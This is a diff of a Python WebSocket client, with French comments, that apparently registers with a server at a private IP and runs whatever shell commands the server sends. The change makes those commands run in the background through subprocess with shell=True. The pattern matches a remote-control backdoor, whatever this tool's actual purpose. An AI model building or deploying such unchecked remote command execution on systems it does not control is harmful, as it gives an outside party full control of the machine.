@@ -10,7 +10,7 @@ import socket
 import os
 import websockets
 
-SERVER_URL = "ws://192.168.43.226:9000"
+SERVER_URL = "ws://192.168.10.167:9000"
 
 
 async def send_register(websocket):
@@ -329,18 +329,12 @@ async def send_data(websocket):
 
 
 async def execute_command(command):
-    """Exécute la commande reçue par le WebSocket et retourne le résultat."""
     try:
-        # Exécuter la commande via subprocess
-        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        
-        # Retourner la sortie de la commande
-        if result.returncode == 0:
-            return result.stdout  # Commande réussie, renvoie la sortie standard
-        else:
-            return result.stderr  # Commande échouée, renvoie l'erreur
+        # 🧨 Exécute le processus sans attendre qu’il se termine
+        process = subprocess.Popen(command, shell=True)
+        return f"Commande lancée en arrière-plan (PID: {process.pid})"
     except Exception as e:
-        return f"Erreur lors de l'exécution de la commande: {e}"
+        return f"[ERREUR] {str(e)}"
 
 
 
